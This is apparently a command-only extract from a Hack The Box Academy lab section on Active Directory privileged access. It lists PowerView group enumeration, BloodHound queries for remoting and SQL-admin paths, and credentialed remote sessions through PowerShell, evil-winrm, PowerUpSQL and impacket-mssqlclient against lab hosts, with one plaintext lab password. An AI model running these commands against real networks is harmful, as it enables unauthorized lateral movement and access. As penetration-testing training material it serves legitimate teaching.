# Section 23: Privileged Access

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1275
- Code/command blocks: 12

> Terminal output is omitted; only commands & scripts are captured.

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

```powershell
$password = ConvertTo-SecureString "{{PASSWORD}}" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("{{DOMAIN_NB}}\{{USERNAME}}", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

```

```bash
gem install evil-winrm
```

```bash
evil-winrm 
```

```bash
evil-winrm -i 10.129.201.234 -u {{USERNAME}}
```

```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

```powershell
cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
 Get-SQLInstanceDomain
```

```powershell
 Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "{{DOMAIN_NB}}\damundsen" -password "SQL1234!" -query 'Select @@version'
```

```bash
impacket-mssqlclient 
```

```bash
impacket-mssqlclient {{DOMAIN_NB}}/DAMUNDSEN@172.16.5.150 -windows-auth
```

